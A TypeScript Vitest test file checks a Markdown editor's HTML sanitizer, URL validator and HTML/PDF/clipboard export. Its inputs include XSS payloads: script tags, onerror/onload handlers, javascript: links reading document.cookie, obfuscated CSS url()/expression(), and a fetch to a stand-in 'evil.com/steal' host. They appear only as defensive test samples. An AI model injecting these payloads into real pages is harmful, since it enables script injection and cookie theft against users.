import { describe, expect, it, vi } from 'vitest';
import * as mermaidRenderer from '../src/renderers/mermaidRenderer';
import {
  buildStandaloneHtmlDocument,
  copyAsRichText,
  exportPrintPdf,
  exportStandaloneHtml,
  renderMarkdownToStaticHtmlBody,
  resolveCssUrls,
} from '../src/utils/exporter';
import { isSafeExportUrl, sanitizeMarkdownHtml } from '../src/utils/htmlSanitizer';

describe('htmlSanitizer security allowlist and URL validation', () => {
  it('allows safe Markdown HTML tags while stripping executable/dangerous tags and attributes', () => {
    const dirty = [
      '<div class="callout" style="color: #222; background: url(https://evil.com/bg.png); width: expression(alert(1))">',
      '  <p>Press <kbd>Ctrl</kbd> + <kbd>S</kbd> and <sup>2</sup></p>',
      '  <script>window.parent.hacked = true;</script>',
      '  <iframe src="https://evil.com" srcdoc="<script>alert(1)</script>"></iframe>',
      '  <object data="evil.swf"></object>',
      '  <embed src="evil.swf" />',
      '  <form action="https://evil.com"><input name="fonts" /></form>',
      '  <base href="https://evil.com/" />',
      '  <meta http-equiv="refresh" content="0;url=https://evil.com" />',
      '  <link rel="stylesheet" href="https://evil.com/x.css" />',
      '  <style>body { display: none !important; }</style>',
      '  <svg onload="alert(1)"><g onload="alert(2)"></g></svg>',
      '  <math><mtext><img src="x" onerror="alert(1)" /></mtext></math>',
      '  <img id="fonts" name="images" src="x" onerror="alert(1)" ONLOAD="alert(2)" alt="pic" />',
      '  <a href="javascript:alert(1)" onclick="evil()">Bad Link</a>',
      '  <a href="https://prismamd.dev" target="_blank">Good Link</a>',
      '</div>',
    ].join('\n');

    const clean = sanitizeMarkdownHtml(dirty);

    expect(clean).toContain('<kbd>Ctrl</kbd>');
    expect(clean).toContain('<sup>2</sup>');
    expect(clean).toContain('color: #222');
    expect(clean).not.toContain('url(');
    expect(clean).not.toContain('expression(');
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('hacked');
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('srcdoc');
    expect(clean).not.toContain('<object');
    expect(clean).not.toContain('<embed');
    expect(clean).not.toContain('<form');
    expect(clean).not.toContain('<input');
    expect(clean).not.toContain('<base');
    expect(clean).not.toContain('<meta');
    expect(clean).not.toContain('<link');
    expect(clean).not.toContain('<style');
    expect(clean).not.toContain('<svg');
    expect(clean).not.toContain('<math');
    expect(clean).not.toMatch(/\bon[a-z]+\s*=/i);
    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('id="fonts"');
    expect(clean).not.toContain('name="images"');
    expect(clean).toContain('<a href="#">Bad Link</a>');
    expect(clean).toContain('rel="noopener noreferrer"');
  });

  it('blocks CSS comment and backslash-escape obfuscation in style attributes', () => {
    const dirty =
      '<span style="background: u/**/rl(javascript:alert(1)); width: expr/*x*/ession(alert(1)); border-image: \\75\\72\\6c(https://evil.com); font-weight: 700">safe</span>';
    const clean = sanitizeMarkdownHtml(dirty);

    expect(clean).toBe('<span style="font-weight: 700">safe</span>');
  });

  it('validates export URLs for links and images accurately', () => {
    expect(isSafeExportUrl('https://example.com/docs?a=1#top')).toBe(true);
    expect(isSafeExportUrl('http://localhost:4173/test')).toBe(true);
    expect(isSafeExportUrl('mailto:team@example.com')).toBe(true);
    expect(isSafeExportUrl('#heading-1')).toBe(true);
    expect(isSafeExportUrl('./notes/readme.md')).toBe(true);
    expect(isSafeExportUrl('../assets/diagram.png')).toBe(true);
    expect(isSafeExportUrl('/docs/index.html')).toBe(true);
    expect(isSafeExportUrl('guide.md')).toBe(true);

    expect(isSafeExportUrl('javascript:alert(1)')).toBe(false);
    expect(isSafeExportUrl('  JaVaScRiPt:alert(1)  ')).toBe(false);
    expect(isSafeExportUrl('java\nscript:alert(1)')).toBe(false);
    expect(isSafeExportUrl('java\tscript:alert(1)')).toBe(false);
    expect(isSafeExportUrl('vbscript:msgbox(1)')).toBe(false);
    expect(isSafeExportUrl('data:text/html,<script>alert(1)</script>', true)).toBe(false);
    expect(isSafeExportUrl('data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+', true)).toBe(false);
    expect(isSafeExportUrl('//evil.example.com/payload.js')).toBe(false);

    const pngDataUri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';
    expect(isSafeExportUrl(pngDataUri, false)).toBe(false);
    expect(isSafeExportUrl(pngDataUri, true)).toBe(true);
    expect(isSafeExportUrl('data:image/webp;base64,UklGRg==', true)).toBe(true);
    expect(isSafeExportUrl('data:image/avif;base64,AAAA', true)).toBe(true);
  });
});

describe('exporter KaTeX font resolution, XSS isolation, and PDF print readiness', () => {
  it('resolves relative CSS url() references against the stylesheet URL while keeping data/http URLs intact', () => {
    const css = [
      '@font-face {',
      '  font-family: KaTeX_Main;',
      '  src: url("./KaTeX_Main-Regular-abc.woff2") format("woff2"), url(KaTeX_Main-Regular-abc.woff) format("woff");',
      '}',
      '.bg { background: url("data:image/png;base64,AAA"); }',
      '.remote { background: url("https://example.com/a.png"); }',
    ].join('\n');

    const resolved = resolveCssUrls(
      css,
      'https://gmartorell.github.io/prismamd/assets/lazy-katex-123.css',
    );

    expect(resolved).toContain(
      'url("https://gmartorell.github.io/prismamd/assets/KaTeX_Main-Regular-abc.woff2")',
    );
    expect(resolved).toContain(
      'url("https://gmartorell.github.io/prismamd/assets/KaTeX_Main-Regular-abc.woff")',
    );
    expect(resolved).toContain('url("data:image/png;base64,AAA")');
    expect(resolved).toContain('url("https://example.com/a.png")');
  });

  it('embeds KaTeX styles with inlined woff2 fonts, CSP meta tag, and waits before calling print()', async () => {
    const styleEl = document.createElement('style');
    styleEl.textContent = [
      '@font-face { font-display: block; font-family: KaTeX_Main; src: url("./KaTeX_Main-Regular.woff2") format("woff2"); }',
      '.katex { font: normal 1.21em KaTeX_Main, Times New Roman, serif; }',
    ].join('\n');
    document.head.appendChild(styleEl);

    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValue({
      ok: true,
      arrayBuffer: async () => new Uint8Array([119, 79, 70, 50]).buffer,
    } as Response);

    const origCreateElement = document.createElement.bind(document);
    let capturedHtml = '';
    const printMock = vi.fn();

    const createSpy = vi.spyOn(document, 'createElement').mockImplementation(((tagName: string) => {
      const el = origCreateElement(tagName);
      if (tagName.toLowerCase() === 'iframe') {
        const fakeDoc = {
          open: vi.fn(),
          write: vi.fn((html: string) => {
            capturedHtml = html;
          }),
          close: vi.fn(),
          fonts: { ready: Promise.resolve() },
          images: [],
        };
        Object.defineProperty(el, 'contentDocument', { value: fakeDoc });
        Object.defineProperty(el, 'contentWindow', {
          value: {
            focus: vi.fn(),
            print: printMock,
            addEventListener: vi.fn(),
            requestAnimationFrame: (cb: FrameRequestCallback) => {
              cb(0);
              return 1;
            },
          },
        });
      }
      return el;
    }) as typeof document.createElement);

    try {
      await exportPrintPdf('Test', 'Euler $e^{i\\pi}+1=0$\n\n$$\\sqrt{x^2+y^2}$$', 'light');

      expect(printMock).toHaveBeenCalledTimes(1);
      expect(capturedHtml).toContain(
        '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; img-src data: https: http: blob:; style-src \'unsafe-inline\'; font-src data:;" />',
      );
      expect(capturedHtml).toContain('class="katex"');
      expect(capturedHtml).toContain('data:font/woff2;base64,d09GMg==');
      expect(capturedHtml).toContain('font-display: swap');
      expect(capturedHtml).not.toContain('url("./KaTeX_Main-Regular.woff2")');
    } finally {
      createSpy.mockRestore();
      fetchSpy.mockRestore();
      styleEl.remove();
    }
  });

  it('sanitizes raw HTML blocks/inlines and unsafe Markdown links/images before rendering and printing', async () => {
    const maliciousMarkdown = [
      '# Untrusted Note',
      '',
      'Shortcut <kbd>Ctrl</kbd> + <kbd>P</kbd> with math $x^2$ and inline <img src="x" onerror="window.parent.pwned=1"> and <script>alert(1)</script>.',
      '',
      '[Evil JS Link](javascript:alert(document.cookie)) and [Safe Link](https://example.com)',
      '',
      '![Bad SVG](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)',
      '',
      '![Good PNG](data:image/png;base64,iVBORw0KGgo=)',
      '',
      '<script>fetch("https://evil.com/steal")</script>',
      '',
      '<svg onload="alert(99)"><circle r="10" /></svg>',
    ].join('\n');

    const bodyHtml = await renderMarkdownToStaticHtmlBody(maliciousMarkdown, 'light');

    expect(bodyHtml).toContain('<kbd>Ctrl</kbd>');
    expect(bodyHtml).toContain('<kbd>P</kbd>');
    expect(bodyHtml).toContain('class="katex"');
    expect(bodyHtml).toContain('<a href="#" target="_blank" rel="noopener noreferrer">Evil JS Link</a>');
    expect(bodyHtml).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">Safe Link</a>');
    expect(bodyHtml).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(bodyHtml).not.toContain('data:image/svg+xml');
    expect(bodyHtml).not.toContain('javascript:');
    expect(bodyHtml).not.toContain('<script');
    expect(bodyHtml).not.toContain('<svg');
    expect(bodyHtml).not.toContain('onerror');
    expect(bodyHtml).not.toContain('onload');
  });

  it('skips KaTeX stylesheet and woff2 font inlining on plain Markdown documents without math', async () => {
    const styleEl = document.createElement('style');
    styleEl.textContent = [
      '@font-face { font-family: KaTeX_AMS; src: url("./KaTeX_AMS-Uncached.woff2") format("woff2"); }',
      '.katex { font-family: KaTeX_AMS, serif; }',
    ].join('\n');
    document.head.appendChild(styleEl);

    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValue({
      ok: true,
      arrayBuffer: async () => new Uint8Array([119, 79, 70, 50]).buffer,
    } as Response);

    let exportedBlobText = '';
    let downloadedFilename = '';
    const origCreateObjectURL = URL.createObjectURL;
    const origRevokeObjectURL = URL.revokeObjectURL;
    URL.createObjectURL = vi.fn((blob: Blob | MediaSource) => {
      if (blob instanceof Blob) {
        void blob.text().then((txt) => {
          exportedBlobText = txt;
        });
      }
      return 'blob:prismamd-test';
    });
    URL.revokeObjectURL = vi.fn();
    const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
      this: HTMLAnchorElement,
    ) {
      downloadedFilename = this.download;
    });

    try {
      await exportStandaloneHtml('', '# Plain Heading\n\nJust text and `inline code`.', 'dark', {
        locale: 'en',
        defaultDocFilename: 'untitled-note',
      });
      await new Promise((r) => setTimeout(r, 10));

      expect(fetchSpy).not.toHaveBeenCalled();
      expect(downloadedFilename).toBe('untitled-note.html');
      expect(exportedBlobText).toContain('<html lang="en">');
      expect(exportedBlobText).toContain('http-equiv="Content-Security-Policy"');
      expect(exportedBlobText).not.toContain('KaTeX_AMS');
      expect(exportedBlobText).not.toContain('data:font/woff2;base64,');
      expect(exportedBlobText).toContain(
        'pre, code, th, .github-alert { background: #f6f8fa !important; color: #111 !important; border-color: #d0d7de !important; }',
      );
      expect(exportedBlobText).toContain('.mermaid-export svg { max-width: 100%; height: auto; }');
    } finally {
      clickSpy.mockRestore();
      URL.createObjectURL = origCreateObjectURL;
      URL.revokeObjectURL = origRevokeObjectURL;
      fetchSpy.mockRestore();
      styleEl.remove();
    }
  });

  it('defaults buildStandaloneHtmlDocument to lang="es" and "documento" when options are omitted', () => {
    const html = buildStandaloneHtmlDocument('', '<p>Hola</p>', 'light');
    expect(html).toContain('<html lang="es">');
    expect(html).toContain('<title>documento</title>');
    expect(html).toContain("default-src 'none'");
  });

  it('strips .katex-mathml and forces light Mermaid theme when copying rich text in dark mode', async () => {
    const mermaidSpy = vi
      .spyOn(mermaidRenderer, 'renderMermaidSvg')
      .mockResolvedValue({ svg: '<svg viewBox="0 0 100 40"><text>Node</text></svg>' });

    const capturedItems: Record<string, Blob>[] = [];
    const origClipboardItem = globalThis.ClipboardItem;
    const origClipboard = navigator.clipboard;

    class MockClipboardItem {
      readonly items: Record<string, Blob>;
      constructor(items: Record<string, Blob>) {
        this.items = items;
        capturedItems.push(items);
      }
    }

    Object.defineProperty(globalThis, 'ClipboardItem', {
      configurable: true,
      writable: true,
      value: MockClipboardItem,
    });
    const writeMock = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', {
      configurable: true,
      value: { write: writeMock, writeText: vi.fn() },
    });

    try {
      const md = 'Formula $a^2 + b^2 = c^2$\n\n```mermaid\nflowchart LR\n  A --> B\n```';
      await copyAsRichText(md, 'dark');

      expect(mermaidSpy).toHaveBeenCalledWith('flowchart LR\n  A --> B', 'light');
      expect(writeMock).toHaveBeenCalledTimes(1);
      expect(capturedItems).toHaveLength(1);

      const htmlClip = await capturedItems[0]['text/html'].text();
      const plainClip = await capturedItems[0]['text/plain'].text();

      expect(htmlClip).toContain('class="katex-html"');
      expect(htmlClip).not.toContain('katex-mathml');
      expect(htmlClip).not.toContain('<math');
      expect(htmlClip).toContain('<div class="mermaid-export"><svg');
      expect(plainClip).toBe(md);
    } finally {
      mermaidSpy.mockRestore();
      Object.defineProperty(globalThis, 'ClipboardItem', {
        configurable: true,
        writable: true,
        value: origClipboardItem,
      });
      Object.defineProperty(navigator, 'clipboard', {
        configurable: true,
        value: origClipboard,
      });
    }
  });
});
